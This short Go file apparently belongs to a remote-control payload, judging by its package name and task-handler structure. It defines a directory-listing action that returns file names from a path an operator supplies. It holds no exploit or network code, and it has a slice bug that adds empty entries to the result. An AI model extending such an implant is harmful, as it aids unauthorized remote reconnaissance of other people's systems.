package actions

import (
	"golang_payload/types"
	"golang_payload/utils"
	"os"
)

func ListDir(task types.Task) {
	dir := task.Args["dir"].(string)
	files, err := os.ReadDir(dir)
	file_names := make([]string, len(files))
	if err != nil {
		utils.Finish(task, err.Error(), false)
		return
	}
	for _, file := range files {
		file_names = append(file_names, file.Name())
	}
	utils.Finish(task, file_names, true)
}
